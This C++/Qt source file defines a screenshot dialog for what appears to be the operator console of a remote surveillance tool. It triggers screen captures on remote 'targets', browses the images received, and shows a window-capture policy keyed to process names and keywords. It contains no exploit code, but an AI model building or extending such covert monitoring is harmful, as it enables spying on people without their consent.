#include "capturedlg.h"
#include "target.h"

#include <QtGui>
#include <QFileIconProvider>
#include "maindlg.h"
#include "PicContainer.h"
#include "Utility.h"
#include "nofocusstyle.h"
#include "include/T5Screen.h"

CaptureDlg::CaptureDlg(QWidget *parent, Target* tar)
	: QWidget(parent)
	, m_tar(tar)
{
	ui.setupUi(this);

	InitCustomAppearance();
	InitConnection();
	InitCaptureFileList();

	UpdateCapturePolicy();
}

CaptureDlg::~CaptureDlg()
{

}

void CaptureDlg::InitCustomAppearance()
{
	if ( MobileDevice(m_tar) )
		ui.frm2->hide();

	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);
	//ui.trScreenshot->setStyle(nofocusStyle);
	ui.tbScreenshot->horizontalHeader()->resizeSection(0, 200);
}

void CaptureDlg::InitConnection()
{
	// 截屏
	connect(ui.btnCaptureScreen, SIGNAL(clicked()), this, SLOT(onBtnCaptureScreenClicked()));

	// 点击截屏目录
	connect(ui.trScreenshot, SIGNAL(itemClicked(QTreeWidgetItem*, int)), this, SLOT(onTrScreenshotItemClicked(QTreeWidgetItem*, int)));

	// 点击图片
	connect(ui.tbScreenshot, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onTbScreenshotItemClicked(QTableWidgetItem*)));

	// 修改策略
	connect(ui.btnModifyPolicy, SIGNAL(clicked()), this, SIGNAL(emitModify()));

	// 双击图片
	connect(ui.tbScreenshot, SIGNAL(itemDoubleClicked(QTableWidgetItem*)), this, SLOT(onTbScreenshotItemDoubleClicked(QTableWidgetItem*)));
}

void CaptureDlg::InitCaptureFileList()
{
	// 刷新本地目录添加截图目录列表

	QTreeWidgetItem* root = ui.trScreenshot->topLevelItem(0);
	QFileIconProvider icon;
	root->setIcon(0, icon.icon(QFileIconProvider::Folder));

	root->takeChildren();

	std::wstring widSearch = m_tar->wideScreenPath + L"\\*.*";
	WIN32_FIND_DATAW FileData;
	HANDLE  hSearch = FindFirstFileW(widSearch.c_str(), &FileData);

	if (hSearch == INVALID_HANDLE_VALUE)
		return;

	do
	{
		if (FileData.cFileName[0] == L'.')
		{
			continue;
		}

		if (FileData.dwFileAttributes && FILE_ATTRIBUTE_DIRECTORY)
		{
			QTreeWidgetItem* item = new QTreeWidgetItem;
			QFileIconProvider provider;
			item->setIcon(0, provider.icon(QFileIconProvider::Folder));
			item->setText(0, QString::fromStdWString(std::wstring(FileData.cFileName)));
			root->addChild(item);
		}

	} while(FindNextFileW(hSearch, &FileData));

	FindClose(hSearch);

	root->setExpanded(true);
}

void CaptureDlg::onBtnCaptureScreenClicked()
{
	if (m_tar->tarStatus == TAROFFLINE)
	{
		MsgBoxInfoExW((HWND)this->winId(), L"不能对离线目标进行\"在线截屏\"!");
		return;
	}

	if (m_tar->pluginVect[4] == NULL)
	{
		SetTarStatusInfoExW(STATUS_ERROR, m_tar, L"[目标%s(ID:%u)] 无法进行全屏截取! 没有安装%s!",
			m_tar->widTargetName.c_str() ,m_tar->dwTargetID,ConvertPluginIdToLangW(4).c_str());
		MsgBoxErrorExW((HWND)this->winId(), L"无法进行全屏截取\r\n没有安装%s", ConvertPluginIdToLangW(4).c_str());
		return;
	}

	if (m_tar->pluginVect[4]->dwPluginVer == 0)
	{
		SetTarStatusInfoExW(STATUS_ERROR, m_tar, L"[目标%s(ID:%u)] 无法进行全屏截取! 没有启用%s!",
			m_tar->widTargetName.c_str() ,m_tar->dwTargetID,ConvertPluginIdToLangW(4).c_str());
		MsgBoxErrorExW((HWND)this->winId(), L"无法进行全屏截取\r\n%s没有启用", ConvertPluginIdToLangW(4).c_str());
		return;
	}

	FrmMain->ctrConn->Send_SCP(m_tar->dwTargetID);
}

void CaptureDlg::onTrScreenshotItemClicked( QTreeWidgetItem* item, int column )
{
	ui.tbScreenshot->clearContents();
	ui.tbScreenshot->setRowCount(0);

	if ( NULL != item->parent() )
	{
		int index = 0;
		std::wstring widSearch = this->m_tar->wideScreenPath + L"\\" + item->text(0).toStdWString() + L"\\*.bmp";

		WIN32_FIND_DATAW FileData;
		HANDLE  hSearch = FindFirstFileW(widSearch.c_str(), &FileData);
		if (hSearch == INVALID_HANDLE_VALUE)
		{
			return;
		}

		do
		{
			if (FileData.cFileName[0] == L'.')
			{
				continue;
			}

			int filesize = FileData.nFileSizeLow / 1024;
			if (filesize == 0 && FileData.nFileSizeLow != 0)
			{
				filesize = 1;
			}

			ui.tbScreenshot->insertRow(0);
			QTableWidgetItem* caption = new QTableWidgetItem;
			QTableWidgetItem* size = new QTableWidgetItem;  

			caption->setText(QString::fromStdWString(std::wstring(FileData.cFileName)));
			size->setText(QString("%1 KB").arg(filesize));
			ui.tbScreenshot->setItem(0, 0, caption);
			ui.tbScreenshot->setItem(0, 1, size);

		} while(FindNextFileW(hSearch, &FileData));

		FindClose(hSearch);
	}
}

void CaptureDlg::onTbScreenshotItemClicked( QTableWidgetItem* item )
{
	item = ui.tbScreenshot->item(item->row(), 0);
	QTreeWidgetItem* dir = ui.trScreenshot->selectedItems().at(0);
	std::wstring picPath = this->m_tar->wideScreenPath + 
		L"\\" + dir->text(0).toStdWString() + L"\\" + item->text().toStdWString();

	ui.screenView->SetPath(QString::fromStdWString(picPath));
}

void CaptureDlg::onTbScreenshotItemDoubleClicked(QTableWidgetItem* item)
{
	QTreeWidgetItem* dir = ui.trScreenshot->selectedItems().at(0);
	std::wstring path = this->m_tar->wideScreenPath + L"\\" + dir->text(0).toStdWString();

	ShellExecute(NULL, L"open", path.c_str(), NULL, NULL, SW_SHOW);
}

void CaptureDlg::UpdateScreen( MSG* msg )
{
	PWCHAR lpwzNodeName = (PWCHAR)msg->wParam;
	PWCHAR lpwzFileName = (PWCHAR)msg->lParam;

	QTreeWidgetItem* item = ui.trScreenshot->topLevelItem(0);
	QTreeWidgetItem* group = NULL;
	for (int i = 0; i < item->childCount(); i++)
	{
		QTreeWidgetItem* child = item->child(i);
		if ( 0 == wcscmp(lpwzNodeName, child->text(0).toStdWString().c_str()) )
		{
			group = child;
			break;
		}
	}

	if ( group == NULL )
	{
		// 如果节点上没有，则增加节点
		QTreeWidgetItem* newGroup = new QTreeWidgetItem;
		QFileIconProvider provider;
		newGroup->setIcon(0, provider.icon(QFileIconProvider::Folder));
		newGroup->setText(0, QString::fromStdWString(std::wstring(lpwzNodeName)));
		item->addChild(newGroup);
		item->setExpanded(true);
	}
	else
	{
		// 如果是SELECTED，增加到下面的列表上
		//
		if ( group->isSelected() )
		{
			std::wstring widSubDir = group->text(0).toStdWString() + L"\\" + std::wstring(lpwzFileName);
			std::wstring wideFile = this->m_tar->wideScreenPath + L"\\" + widSubDir;

			HANDLE hf = CreateFileW(wideFile.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			int nSize = GetFileSize(hf, NULL);
			CloseHandle(hf);

			int filesize = nSize / 1024;
			if (filesize == 0 && nSize != 0)
			{
				filesize = 1;
			}

			ui.tbScreenshot->insertRow(0);
			QTableWidgetItem* caption = new QTableWidgetItem;
			QTableWidgetItem* size = new QTableWidgetItem;

			caption->setText(QString::fromStdWString(std::wstring(lpwzFileName)));
			size->setText(QString("%1 KB").arg(filesize));
			ui.tbScreenshot->setItem(0, 0, caption);
			ui.tbScreenshot->setItem(0, 1, size);
		}
	}
}

void CaptureDlg::GetCapturePolicy( bool& enable, std::wstring& procList, std::wstring& keyWord, int& interval )
{
	if ( NULL != m_tar->pluginVect[4] )
	{
		PCAPTURE_CONFIG lpCaptureCfgData  = (PCAPTURE_CONFIG)m_tar->pluginVect[4]->lpbyData;

		if ( lpCaptureCfgData )
		{
			enable = lpCaptureCfgData->bCapWindow;

			if ( enable )
			{
				if (lpCaptureCfgData->dwKeyListLength > 0)
				{
					keyWord = (PWCHAR)((PBYTE)lpCaptureCfgData + lpCaptureCfgData->dwKeyListOffset);
				}

				if ( lpCaptureCfgData->dwProcessListLength > 0 )
				{
					procList = (PWCHAR)((PBYTE)lpCaptureCfgData + lpCaptureCfgData->dwProcessListOffset);
				}

				interval = lpCaptureCfgData->dwWindowInterval;
			}
		}
	}
}

void CaptureDlg::UpdateCapturePolicy()
{
	bool enable = false;
	std::wstring procList, keyWord;
	int interval = 0;

	GetCapturePolicy(enable, procList, keyWord, interval);

	ui.lbCaptureWindow->setText(QString::fromLocal8Bit(enable ? "已开启" : "已关闭" ));
	ui.edtProcList->setText(QString::fromStdWString(procList));
	ui.edtProcList->setToolTip(QString::fromStdWString(procList));
	ui.edtKeyWord->setText(QString::fromStdWString(keyWord));
	ui.edtKeyWord->setToolTip(QString::fromStdWString(keyWord));

	if ( enable )
	{
		ui.lbCaptureWindow->setStyleSheet("QLabel{font-family:'Microsoft Yahei';color:red;}");
		ui.edtProcList->setEnabled(true);
		ui.edtKeyWord->setEnabled(true);
		ui.lbProcess->setEnabled(true);
		ui.lbKeyword->setEnabled(true);
	}
	else
	{
		ui.lbCaptureWindow->setStyleSheet("QLabel{font-family:'Microsoft Yahei';color:#aaaaaa;}");
		ui.edtProcList->setEnabled(false);
		ui.edtKeyWord->setEnabled(false);
		ui.lbProcess->setEnabled(false);
		ui.lbKeyword->setEnabled(false);
	}
}
